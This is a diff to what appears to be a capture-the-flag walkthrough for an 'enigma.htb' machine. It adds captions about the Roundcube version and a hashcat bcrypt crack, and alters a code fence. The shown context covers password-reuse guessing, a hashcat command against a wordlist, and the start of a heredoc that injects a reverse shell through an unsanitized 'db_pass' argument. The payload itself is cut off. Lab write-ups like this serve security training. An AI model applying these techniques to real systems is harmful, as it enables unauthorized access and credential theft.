@@ -44,6 +44,7 @@ PORT    STATE SERVICE VERSION
 - We are in but this doesn't seem useful too, try `ssh kevin@enigma.htb` and see if ssh can be directly used, but it fails because they seem to use FIDO
 - Also, the RoundCube version is 
     - ![image](./img-07.png)
+      <span class="caption">The webmail's About dialog: Roundcube 1.6.16, a current release. That's why I didn't spend time attacking Roundcube itself.</span>
     - Which is not known for any vulnerabilities for now, it is the patched version, so maybe attacking RoundCube is not the intended way? Let's keep enumerating on this site
 - Still nothing useful shows, but we know that `sarah@enigma.htb` is the person that sends the message to kevin, and after an instinct guess I thought that she might just use the same password as kevin, because they might have experienced the same onboarding experience, and the Password shown seems not random at all. And I was right!
     - ![image](./img-08.png)
@@ -62,6 +63,7 @@ PORT    STATE SERVICE VERSION
     - `hashcat -m 3200 haris.hash /usr/share/wordlists/john.lst`
     - We cracked it!!!!!!!!
         - ![image](./img-11.png)
+          <span class="caption">hashcat mode 3200 (bcrypt) reports `Status: Cracked` in 48 seconds against `john.lst`. bcrypt is deliberately slow, so a hit this fast means the password itself was weak.</span>
 - Let's head to `~/.local/share/hashcat` and cat the `hashcat.potfile` to grab the pwd. Then head back to the shell and login to claim the userflag!
 
 ## Priv Escalation-Root flag
@@ -96,7 +98,7 @@ Can I influence it? (the control)
     - **ID**: this is the easiest, where it is already obvious in the config.yaml file
     - **Request shape**: what goes before the id? We try some conventions: `actionId, actionName, action, id, name`
 - Lastly, we just have to set up this file and inject the reverse shell: (inject in db_pass because unsanitized)
-```bash=
+```bash
 cat > /tmp/rev.json <<'EOF'
 { "actionId": "backup_database",
   "arguments": [
